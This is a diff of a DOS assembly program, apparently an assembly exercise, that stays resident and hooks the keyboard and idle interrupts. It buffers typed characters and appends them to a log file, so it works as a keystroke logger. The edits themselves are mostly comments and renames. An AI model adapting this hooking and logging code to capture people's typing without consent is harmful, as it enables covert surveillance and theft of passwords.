@@ -11,19 +11,15 @@ Start:
 		mov bx, 9h*4h		;9*4 -- address of 9'th interruption
 		call ChangeInterruption
 
-		mov bx, 28h*4h
+		mov bx, 28h*4h		;same for 28'th int
 		call ChangeInterruption
 
 		sti
 
-		jmp StayResident
 
-
-
-
-StayResident:
+;StayResident:
 		mov ax, 3100h
-		mov dx, 400h		;program size; must be enough
+		mov dx, 400h		;program size; 400h must be enough
 		int 21h
 
 
@@ -70,12 +66,12 @@ ChangeInterruption proc
 
 
 ;======================================================================================
-;Writes scancode to buf
+;Writes scancode from buf to file
 ;======================================================================================
 New28h	proc
 		pusha
 
-		call flush_buff 
+		call to_file 
 
 		popa
 
@@ -85,8 +81,9 @@ New28h	proc
 @@end_proc:
 		iret
 		endp
-Old28: 		dw 0
-			dw 0
+Old28: 	dw 0
+		dw 0
+
 ;======================================================================================
 ;Writes scancode to buf
 ;======================================================================================
@@ -103,8 +100,9 @@ New09h 	proc
 
 		iret
 		endp
-Old09: 		dw 0
-			dw 0
+
+Old09: 	dw 0
+		dw 0
 
 ;======================================================================================
 ;Writes a symbol to buf using 16'th interrupt to get ascii code from scancode
@@ -116,7 +114,7 @@ to_buf	proc
 		mov ah, 01h
 		int 16h
 
-		jz @@exit
+		jz @@exit		;if no symbol entered
 
 		mov bl, buff_end 
 		xor bh, bh
@@ -131,7 +129,7 @@ to_buf	proc
 ;======================================================================================
 ;Writes data from buf to file
 ;======================================================================================
-flush_buff proc 
+to_file proc 
 
 		push ds cs
 		pop ds
@@ -141,41 +139,38 @@ flush_buff proc
 	
 		push cx
 
-	;opening file by adress in ds:dx and saving its handler  
+;fopen(log_file, "r")
 		mov ax, 3d01h; 
 		mov dx, offset log_file;
 		int 21h
 		mov file_handler, ax
 
 
-	;moving cursor to the end of file
+;fseek(log, 0, SEEK_END)
 		mov ax, 4202h
 		mov bx, file_handler
 		xor cx, cx
 		xor dx, dx
 		int 21h
 
-;!!! 
 		mov al, buff_start
 		xor ah, ah
 		mov dx, offset buff
 		add dx, ax
 
 		pop cx
-	;writing to file
+;writing to file
 		mov ah, 40h
 		mov bx, file_handler
 		sub cl, buff_start
 		xor ch, ch
-;		mov dx, offset buff
-;		add dx, head_ind
 		int 21h
 		
 		add cl, buff_start
 		xor ch, ch
 		mov buff_start, cl
 
-	;closing file
+;fclose(log)
 		mov ah, 3eh
 		mov bx, file_handler
 		int 21h
